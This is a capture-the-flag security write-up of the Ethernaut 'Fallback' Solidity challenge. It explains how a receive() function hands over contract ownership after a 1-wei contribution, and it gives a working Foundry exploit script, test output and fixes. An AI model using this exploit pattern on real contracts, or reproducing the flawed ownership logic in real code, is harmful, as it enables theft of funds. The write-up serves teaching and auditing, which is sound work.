# Fallback — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 01 — Fallback](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-fallback) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Fallback.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

The `Fallback` contract implements two different rules for changing `owner`. The public `contribute()` path requires a caller's cumulative contribution to exceed the current owner's recorded total — but the deployer is seeded with `1000 ether` in `contributions`, making that path impractical for an attacker.

A second, hidden path exists in `receive()`: any address with a non-zero contribution can become owner by sending a plain ETH transfer. An attacker contributes 1 wei, sends 1 wei to the contract, becomes owner, and calls `withdraw()` to drain the full balance.

**Impact:** complete ownership takeover and theft of all ETH held by the contract.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Attacker becomes `owner` | `fallbackInstance.owner() == PLAYER_ADDRESS` |
| 2 | Contract balance is zero | `address(fallbackInstance).balance == 0` |

**Starting state (SCH):**

- `owner` = deployer
- Contract balance = `0.001 ether`
- Player balance = `1 ether`

---

## Contract overview

```solidity
contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor()           // sets owner, seeds deployer with 1000 ether contribution
    contribute() payable    // records small contributions; may transfer ownership
    getContribution()       // view helper
    withdraw() onlyOwner    // sends full balance to owner
    receive() payable       // plain ETH receive — transfers ownership (bug)
}
```

**Privileged state:** only `owner` can call `withdraw()` and pull the contract's ETH.

---

## Finding

### [C-01] Unrestricted ownership transfer via `receive()` bypasses contribution threshold

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Access control / inconsistent state mutation |
| **Location** | `src/Fallback.sol:34-37` (`receive()`) |
| **Related** | `contribute()` at `src/Fallback.sol:18-24` (inconsistent logic) |
| **CWE** | [CWE-284](https://cwe.mitre.org/data/definitions/284.html) — Improper Access Control |
| **SWC** | [SWC-105](https://swcregistry.io/docs/SWC-105) — Unprotected Ether Withdrawal (downstream impact) |

#### Description

Ownership is meant to be earned by out-contributing the current owner inside `contribute()`. The `receive()` fallback function breaks that invariant: it sets `owner = msg.sender` whenever the sender has **any** recorded contribution and sends **any** positive ETH amount — without comparing contribution totals.

#### Root cause

Two code paths mutate `owner` with different preconditions:

| Path | Trigger | Ownership condition |
|------|---------|---------------------|
| `contribute()` | Explicit function call | `contributions[msg.sender] > contributions[owner]` |
| `receive()` | Plain ETH transfer | `contributions[msg.sender] > 0` only |

The weaker rule in `receive()` is reachable by any user who first calls `contribute()` with a dust amount.

#### Vulnerable code

```34:37:web3-ctf-challenges/01-ethernaut-fallback/src/Fallback.sol
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```

Compare with the stricter path:

```18:24:web3-ctf-challenges/01-ethernaut-fallback/src/Fallback.sol
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
```

The constructor makes the `contribute()` ownership path a decoy:

```8:11:web3-ctf-challenges/01-ethernaut-fallback/src/Fallback.sol
    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }
```

#### Impact

1. **Ownership takeover** — any unprivileged EOA can become `owner`.
2. **Fund theft** — `withdraw()` sends the entire contract balance to `owner`:

```30:32:web3-ctf-challenges/01-ethernaut-fallback/src/Fallback.sol
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
```

On mainnet, this pattern would let an attacker drain all ETH (and potentially use owner privileges in extended designs).

#### Likelihood

**High.** No special tokens, oracle, or timing required. Two transactions plus one low-level call from any EOA.

#### Proof of concept

Local Foundry test: `test/FallbackExploit.t.sol`

```bash
cd web3-ctf-challenges/01-ethernaut-fallback
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 148187)
```

SCH submission snippet: `Exploit.s.sol` (root of challenge folder).

---

## Attack scenario

### Preconditions

- Attacker is an unprivileged EOA with enough ETH for gas + 2 wei.
- Contract holds ETH (e.g. `0.001 ether` in the CTF setup).

### Attack sequence

```
Attacker                          Fallback contract
   |                                      |
   |-- contribute{value: 1 wei}() ------->|  contributions[attacker] = 1 wei
   |                                      |
   |-- call{value: 1 wei}("") ----------->|  receive() → owner = attacker
   |                                      |
   |-- withdraw() ----------------------->|  balance → attacker
   |                                      |
   v                                      v
 owner == attacker                  balance == 0
```

### Step-by-step (7-question gate)

| Step | Answer |
|------|--------|
| **1. Setup** | EOA with ≥ 2 wei + gas |
| **2. Call** | `contribute{value: 1 wei}()` → `call{value: 1 wei}("")` → `withdraw()` |
| **3. Result** | Attacker is `owner`; contract balance = 0 |
| **4. Cost** | 2 wei sent to contract + gas (~148k gas in test) |
| **5. ROI** | Gain `0.001 ether` − 2 wei − gas → strongly positive |
| **6. Privileged access?** | No |
| **7. Viable?** | Yes — trivial, deterministic, single-block |

### State transitions

| Variable | Before | After step 1 | After step 2 | After step 3 |
|----------|--------|--------------|--------------|--------------|
| `contributions[attacker]` | `0` | `1 wei` | `1 wei` | `1 wei` |
| `owner` | deployer | deployer | **attacker** | attacker |
| `address(this).balance` | `0.001 ether` | `0.001 ether + 1 wei` | `0.001 ether + 2 wei` | **`0`** |
| `attacker.balance` | `1 ether` | `1 ether − 1 wei` | `1 ether − 2 wei` | **`≈ 1 ether + 0.001 ether − gas`** |

### Why `contribute()` alone is not the intended path

- Max per call: `< 0.001 ether` (`require(msg.value < 0.001 ether)`).
- Required total to beat deployer: `> 1000 ether`.
- Minimum calls needed: `⌈1000 ether / 0.001 ether⌉` = **1,000,000+** transactions.

The `receive()` path completes in **3 calls**.

---

## Exploit implementation

### SCH platform (`Exploit.s.sol`)

Paste only the `run()` body into the SCH editor — no imports or contract wrapper:

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    fallbackInstance.contribute{value: 1 wei}();

    (bool sent,) = address(fallbackInstance).call{value: 1 wei}("");
    require(sent, "receive() call failed");

    fallbackInstance.withdraw();

    vm.stopBroadcast();
}
```

**Why `.call{value:}("")` instead of a second `contribute()`?**

- `contribute()` would add to `contributions` but would **not** trigger `receive()`.
- A low-level ETH transfer invokes `receive()`, which performs the ownership change.

### Local Foundry test

Full runnable PoC in `test/FallbackExploit.t.sol`:

```solidity
fallbackInstance.contribute{value: 1 wei}();

(bool sent,) = address(fallbackInstance).call{value: 1 wei}("");
require(sent, "receive() call failed");

fallbackInstance.withdraw();

assertEq(fallbackInstance.owner(), player);
assertEq(address(fallbackInstance).balance, 0);
```

---

## Verification checklist

After exploit execution:

- [x] `fallbackInstance.owner() == PLAYER_ADDRESS`
- [x] `address(fallbackInstance).balance == 0`
- [x] Player net balance increased (received contract ETH minus 2 wei and gas)
- [x] Local Foundry test passes

---

## Remediation

### Recommended fix

Remove ownership logic from `receive()`. If ETH reception must be supported, do not mutate privileged state there:

```solidity
receive() external payable {
    require(msg.value > 0);
    // Accept ETH only — do NOT change owner
}
```

### Alternative: unify ownership rules

If `receive()` must participate in ownership, mirror `contribute()` exactly:

```solidity
receive() external payable {
    require(msg.value > 0);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

### Best practice

Use one explicit, auditable function for ownership changes (e.g. `claimOwnership()`) instead of splitting logic across `contribute()` and `receive()`.

---

## Audit checklist (what we missed in the vulnerable design)

| Check | Finding |
|-------|---------|
| All paths that set `owner` | Two paths — only one was strict |
| Sibling function review | `contribute()` vs `receive()` inconsistent |
| Fallback/receive handlers | `receive()` had hidden privilege escalation |
| Constructor seed values | `1000 ether` contribution masked the weak `receive()` check |
| Post-exploit impact | `withdraw()` enables full drain once owner is stolen |

---

## Key lessons

1. **Read every code path that mutates privileged state** — not just the obvious public functions.
2. **`receive()` and `fallback()` are entry points** — treat them with the same scrutiny as named functions.
3. **Inconsistent invariants across siblings = bug** — if `contribute()` compares totals, every other ownership path must too.
4. **Seed values can mislead reviewers** — the 1000 ether deployer contribution suggests `contribute()` is the only viable path; it is not.

> "Read ALL sibling functions. If `vote()` has a modifier, check `poke()`, `reset()`, `harvest()`. The missing modifier on the sibling IS the bug."

This challenge is the canonical example of that rule applied to `contribute()` vs `receive()`.

---

## References

- [OpenZeppelin Ethernaut — Fallback](https://ethernaut.openzeppelin.com/)
- [SCH Fallback challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-fallback)
- [SWC-105: Unprotected Ether Withdrawal](https://swcregistry.io/docs/SWC-105)
- Local artifacts: `Exploit.s.sol`, `script/Exploit.s.sol`, `test/FallbackExploit.t.sol`
